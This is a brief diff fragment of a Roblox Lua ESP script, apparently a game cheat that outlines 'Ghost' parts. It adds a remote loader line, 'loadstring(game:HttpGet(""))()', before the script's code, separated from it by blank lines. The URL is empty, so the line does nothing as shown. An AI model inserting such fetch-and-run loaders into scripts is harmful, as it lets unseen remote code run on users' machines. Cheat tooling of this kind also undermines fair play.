@@ -1,3 +1,8 @@
+loadstring(game:HttpGet(""))()
+
+
+
+
 --// ESP for workspace.Ghost using outlines on VisibleParts
 local Camera = workspace.CurrentCamera
 local Players = game:GetService("Players")
